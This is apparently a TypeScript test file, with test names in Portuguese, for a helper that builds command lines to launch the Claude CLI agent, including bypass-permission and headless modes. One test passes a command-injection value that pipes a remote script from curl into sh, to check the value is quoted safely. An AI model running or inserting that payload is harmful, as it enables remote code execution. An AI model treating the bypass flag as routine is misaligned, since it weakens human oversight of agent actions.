import { expect, test } from "bun:test";

import { buildClaudeArgv } from "./claude-command";
import { argvToShellCommand, shellQuote } from "./shell-argv";

test("permissionMode bypass usa o atalho --dangerously-skip-permissions", () => {
	expect(buildClaudeArgv({ prompt: "oi", permissionMode: "bypass" })).toEqual([
		"claude",
		"--dangerously-skip-permissions",
		"oi",
	]);
});

test("outros modos viram --permission-mode <x>", () => {
	expect(buildClaudeArgv({ prompt: "oi", permissionMode: "plan" })).toEqual([
		"claude",
		"--permission-mode",
		"plan",
		"oi",
	]);
});

test("agent, model e effort entram como flags na ordem estável", () => {
	expect(
		buildClaudeArgv({
			prompt: "faz algo",
			permissionMode: "default",
			agent: "kw",
			model: "opus",
			effort: "high",
		}),
	).toEqual([
		"claude",
		"--permission-mode",
		"default",
		"--agent",
		"kw",
		"--model",
		"opus",
		"--effort",
		"high",
		"faz algo",
	]);
});

test("o prompt é um argumento único, sem virar sintaxe de shell", () => {
	const argv = buildClaudeArgv({
		prompt: 'diga "$HOME" e `date` agora!',
		permissionMode: "bypass",
	});

	expect(argv.at(-1)).toBe('diga "$HOME" e `date` agora!');
	expect(argvToShellCommand(argv)).toBe(
		`claude --dangerously-skip-permissions 'diga "$HOME" e \`date\` agora!'`,
	);
});

test("aspas simples no valor fecham e reabrem o argumento em vez de terminá-lo", () => {
	expect(shellQuote("o'brien")).toBe("'o'\\''brien'");
});

test("metacaractere de shell no agent continua um único argumento", () => {
	const argv = buildClaudeArgv({
		prompt: "oi",
		permissionMode: "bypass",
		agent: "x; curl http://host/x.sh | sh #",
	});

	expect(argv).toEqual([
		"claude",
		"--dangerously-skip-permissions",
		"--agent",
		"x; curl http://host/x.sh | sh #",
		"oi",
	]);
	expect(argvToShellCommand(argv)).toBe(
		"claude --dangerously-skip-permissions --agent 'x; curl http://host/x.sh | sh #' oi",
	);
});

test("background usa modo print com fluxo de eventos e sem sessão interativa", () => {
	expect(
		buildClaudeArgv({ prompt: "/mobile faça", permissionMode: "bypass", headless: true }),
	).toEqual([
		"claude",
		"-p",
		"--output-format",
		"stream-json",
		"--verbose",
		"--dangerously-skip-permissions",
		"/mobile faça",
	]);
});

test("execução headless cria e retoma sessões identificadas", () => {
	expect(
		buildClaudeArgv({
			prompt: "primeiro turno",
			permissionMode: "bypass",
			headless: true,
			sessionId: "run-1",
		}),
	).toEqual([
		"claude",
		"-p",
		"--output-format",
		"stream-json",
		"--verbose",
		"--dangerously-skip-permissions",
		"--session-id",
		"run-1",
		"primeiro turno",
	]);
	expect(
		buildClaudeArgv({
			prompt: "segundo turno",
			permissionMode: "bypass",
			headless: true,
			resumeSessionId: "run-1",
		}),
	).toContain("--resume");
});

test("a sessão só entra no modo headless", () => {
	expect(
		buildClaudeArgv({ prompt: "oi", permissionMode: "bypass", sessionId: "run-1" }),
	).not.toContain("--session-id");
});
